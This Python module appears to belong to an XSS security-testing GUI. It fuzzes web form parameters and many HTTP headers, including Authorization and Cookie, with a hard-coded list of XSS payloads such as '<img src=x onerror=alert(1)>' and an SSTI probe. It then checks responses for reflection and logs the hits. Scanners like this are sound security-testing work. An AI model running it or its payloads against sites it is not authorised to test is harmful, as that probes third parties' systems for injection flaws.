# xss_security_gui/form_fuzzer.py

import requests
from datetime import datetime
import os
import logging
from typing import Optional, List, Dict, Any, Callable
from concurrent.futures import ThreadPoolExecutor, as_completed
from xss_security_gui.payload_mutator import mutate_payload
from xss_security_gui.xss_detector import XSSDetector
from xss_security_gui.utils.core_utils import normalize_url

logger = logging.getLogger(__name__)

# Константы
DEFAULT_TIMEOUT = 4.0
DEFAULT_MAX_WORKERS = 20
SNIPPET_MAX_LENGTH = 300
SNIPPET_CONTEXT_WINDOW = 40
MAX_RESPONSE_SIZE = 10000

# Агрессивные payload'ы для дополнительного тестирования
AGGRESSIVE_PAYLOADS = [
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "'\"><script>alert(1)</script>",
    "{{7*7}}",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>"
]


# ✅ Чтение базовых пейлоадов из файла, если он есть
def load_payloads(path="payloads/xss.txt"):
    default = ["<script>alert(1)</script>"]
    if os.path.exists(path):
        with open(path, encoding="utf-8") as f:
            return [line.strip() for line in f if line.strip()]
    return default


def report_threatintel(data, gui_callback=None):
    """
    Безопасная передача отчёта в Threat Intel.
    Передаём только метаданные: url, метод, payload, статус, категория, сниппет.
    """
    if gui_callback:
        safe_report = {
            "module": "form_fuzzer",
            "url": data.get("url"),
            "method": data.get("method"),
            "payload": data.get("payload"),
            "status": data.get("status"),
            "vulnerable": data.get("vulnerable"),
            "category": data.get("category"),
            "snippet": data.get("snippet"),
            "error": data.get("error", None)
        }
        gui_callback({"form_fuzzer": safe_report})


def create_aggressive_headers(payload: str) -> Dict[str, str]:
    """Создаёт агрессивные заголовки с payload'ами для тестирования"""
    return {
        "User-Agent": payload,
        "Referer": payload,
        "X-Forwarded-For": payload,
        "X-Requested-With": payload,
        "X-Api-Version": payload,
        "X-Original-URL": payload,
        "X-Rewrite-URL": payload,
        "X-Email": payload,
        "X-Account": payload,
        "X-Customer-ID": payload,
        "X-User-ID": payload,
        "X-Session-ID": payload,
        "X-Card-Number": payload,
        "X-Payment-Info": payload,
        "X-Search-Query": payload,
        "X-Debug": payload,
        "X-Test": payload,
        "Authorization": f"Bearer {payload}",
        "Cookie": f"session={payload}; token={payload}",
        "X-XSS-Vector": payload
    }


def fuzz_payload(
    action_url: str,
    method: str,
    inputs: List[str],
    payload: str,
    gui_callback: Optional[Callable[[Dict[str, Any]], None]] = None,
    timeout: float = DEFAULT_TIMEOUT
) -> Dict[str, Any]:
    """
    Реальный боевой XSS‑тест одного payload для одного параметра.
    """

    if not inputs:
        return {
            "url": action_url,
            "method": method,
            "inputs": inputs,
            "payload": payload,
            "status": None,
            "vulnerable": False,
            "error": "Empty inputs",
            "category": "Error",
            "snippet": ""
        }

    # Подставляем payload только в один параметр
    param = inputs[0]
    data = {param: payload}

    # Агрессивные заголовки
    headers = {
        "User-Agent": payload,
        "Referer": payload,
        "X-Forwarded-For": payload,
        "X-Requested-With": payload,
        "X-Api-Version": payload,
        "X-Original-URL": payload,
        "X-Rewrite-URL": payload,
        "X-Email": payload,
        "X-Account": payload,
        "X-Customer-ID": payload,
        "X-User-ID": payload,
        "X-Session-ID": payload,
        "X-Card-Number": payload,
        "X-Payment-Info": payload,
        "X-Search-Query": payload,
        "X-Debug": payload,
        "X-Test": payload,
        "Authorization": f"Bearer {payload}",
        "Cookie": f"session={payload}; token={payload}",
        "X-XSS-Vector": payload
    }

    try:
        normalized_url = normalize_url(action_url)

        # --- Реальный HTTP‑запрос ---
        if method.upper() == "POST":
            r = requests.post(
                normalized_url,
                data=data,
                headers=headers,
                timeout=timeout,
                allow_redirects=True
            )
        else:
            r = requests.get(
                normalized_url,
                params=data,
                headers=headers,
                timeout=timeout,
                allow_redirects=True
            )

        response_text = r.text
        status = r.status_code

        # Ограничение размера
        if len(response_text) > MAX_RESPONSE_SIZE:
            response_text = response_text[:MAX_RESPONSE_SIZE] + "\n...[TRUNCATED]"

        # --- Проверка Reflected XSS ---
        reflected = payload in response_text

        result = {
            "url": normalized_url,
            "method": method,
            "inputs": inputs,
            "payload": payload,
            "status": status,
            "vulnerable": reflected,
            "category": None,
            "snippet": "",
            "response": response_text
        }

        if reflected:
            detector = XSSDetector()

            # Контекст HTML
            ctx = detector.detect_xss_context(response_text, payload)

            # DOM‑based XSS
            inline_hits = detector.scan_inline_js_for_payload(response_text, payload)

            category = ctx or (inline_hits[0][0] if inline_hits else "Reflected HTML")

            # Snippet
            pos = response_text.find(payload)
            snippet = (
                inline_hits[0][1]
                if inline_hits
                else response_text[max(0, pos - SNIPPET_CONTEXT_WINDOW): pos + len(payload) + SNIPPET_CONTEXT_WINDOW]
            )

            result["category"] = category
            result["snippet"] = snippet.strip()[:SNIPPET_MAX_LENGTH]

            # Логирование
            os.makedirs("logs", exist_ok=True)
            with open("logs/form_fuzz_hits.log", "a", encoding="utf-8") as f:
                f.write(f"[{datetime.now()}] {category} XSS in {method} → {normalized_url}\n")
                f.write(f"Param: {param}\nPayload: {payload}\nStatus: {status}\n")
                f.write(f"Snippet: {result['snippet']}\n\n")

        # Threat Intel
        report_threatintel(result, gui_callback)
        return result

    except requests.Timeout as e:
        return {
            "url": action_url,
            "method": method,
            "inputs": inputs,
            "payload": payload,
            "status": None,
            "vulnerable": False,
            "error": f"Timeout: {str(e)}",
            "category": "Timeout",
            "snippet": ""
        }

    except requests.RequestException as e:
        return {
            "url": action_url,
            "method": method,
            "inputs": inputs,
            "payload": payload,
            "status": None,
            "vulnerable": False,
            "error": f"NetworkError: {str(e)}",
            "category": "NetworkError",
            "snippet": ""
        }

    except Exception as e:
        return {
            "url": action_url,
            "method": method,
            "inputs": inputs,
            "payload": payload,
            "status": None,
            "vulnerable": False,
            "error": f"UnexpectedError: {str(e)}",
            "category": "Error",
            "snippet": ""
        }


def fuzz_form(
    action_url: str,
    method: str,
    inputs: List[Dict[str, Any]],
    param_payloads: Dict[str, List[str]],
    max_workers: int = DEFAULT_MAX_WORKERS,
    gui_callback: Optional[Callable[[Dict[str, Any]], None]] = None,
    timeout: float = DEFAULT_TIMEOUT,
    allowlist: Optional[List[str]] = None
) -> List[Dict[str, Any]]:
    """
    Пер‑параметрний XSS‑фуззинг форми.
    Кожен параметр отримує свої payload‑и.
    """

    # Валидация
    if not inputs:
        raise ValueError("inputs не может быть пустым")

    if not action_url:
        raise ValueError("action_url не может быть пустым")

    # Allowlist
    if allowlist:
        if not any(action_url.startswith(prefix) for prefix in allowlist):
            raise ValueError(f"URL {action_url} не находится в allowlist")

    action_url = normalize_url(action_url)

    results = []
    tasks = []

    # --- Генерация задач по каждому параметру ---
    for inp in inputs:
        name = inp.get("name")
        if not name:
            continue

        payloads = param_payloads.get(name, [])

        for payload in payloads:
            tasks.append({
                "param": name,
                "payload": payload,
                "method": method,
                "url": action_url
            })

    logger.info(f"[FormFuzz] Пер‑параметрный фуззинг {action_url}: {len(tasks)} задач")

    # --- Многопоточный запуск ---
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [
            executor.submit(
                fuzz_payload,
                task["url"],
                task["method"],
                [task["param"]],
                task["payload"],
                gui_callback,
                timeout
            )
            for task in tasks
        ]

        for future in as_completed(futures):
            try:
                results.append(future.result())
            except Exception as e:
                logger.error(f"[FormFuzz] Ошибка в потоке: {e}")
                results.append({
                    "url": action_url,
                    "method": method,
                    "inputs": inputs,
                    "payload": "unknown",
                    "status": None,
                    "vulnerable": False,
                    "error": f"ThreadError: {str(e)}",
                    "category": "Error",
                    "snippet": ""
                })

    logger.info(f"[FormFuzz] Завершено: {len(results)} результатов")
    return results
